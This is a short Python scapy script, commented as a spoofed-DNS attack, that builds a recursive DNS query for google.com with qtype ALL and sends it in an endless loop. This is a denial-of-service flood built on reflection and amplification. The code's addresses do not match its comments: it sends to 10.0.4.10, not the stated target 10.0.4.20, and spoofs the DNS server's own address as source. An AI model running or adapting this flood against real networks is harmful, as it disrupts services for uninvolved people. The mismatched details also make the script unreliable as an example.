#!/usr/bin/python

# This is a script to send spoofed DNS requests
# The target of the attack is 10.0.4.20
# The system at 10.0.2.26 is a poorly configured BIND DNS server that responds to recusrive requests 


from scapy.all import IP,UDP,DNS,DNSQR,send

packet = IP(dst="10.0.4.10", src="10.0.2.26")
packet = packet/UDP(dport=53)
packet = packet/DNS(rd=1,qd=DNSQR(qname="google.com", qtype="ALL"))
while True:
  send(packet,verbose=0)
